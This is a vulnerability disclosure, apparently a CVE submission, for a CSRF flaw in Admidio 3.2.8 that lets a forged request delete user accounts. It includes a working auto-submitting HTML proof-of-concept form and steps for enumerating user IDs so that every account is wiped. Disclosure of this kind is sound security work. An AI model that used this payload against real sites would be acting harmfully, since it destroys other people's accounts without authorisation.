[Suggested description]
Admidio 3.2.8 has CSRF in 
adm_program/modules/members/members_function.php with
  an impact of deleting arbitrary user accounts.
 
  ------------------------------------------
 
  [Additional Information]
  Using this crafted html form we are able to delete any user with 
admin/user privilege.
 
  <html>
    <body onload="javascript:document.forms[0].submit()">
      <form 
action="http://localhost/newadmidio/admidio-3.2.8/adm_program/modules/members/members_function.php">
        <input type="hidden" name="usr&#95;id" value=&#039;9&#039; />
        <input type="hidden" name="mode" value="3" />
        </form>
    </body>
  </html>
 
[Affected Component]
  http://localhost/newadmidio/admidio-3.2.8/adm_program/modules/members/members_function.php
 
  ------------------------------------------
 
  [Attack Type]
  Remote
 
  ------------------------------------------
 
  [Impact Escalation of Privileges]
  true
 
  ------------------------------------------
 
  [Attack Vectors]
  Steps:
  1.) If an user with admin privilege opens a crafted
  html/JPEG(Image),then both the admin and users with user privilege
  which are mentioned by the user id (as like shown below) in the
  crafted request are deleted.
 
   <input type="hidden" name="usr&#95;id" value=&#039;3&#039; />
 
  2.) In admidio by default the userid starts from &#039;0&#039;,
  &#039;1&#039; for system &#039;2&#039; for users, so an attacker
  can start from &#039;2&#039; upto &#039;n&#039; users.
 
  3.)For deleting the user permanently we select &#039;mode=3&#039;(as like shown
  below),then all admin/low privileged users are deleted.
 
   <input type="hidden" name="mode" value="3" />
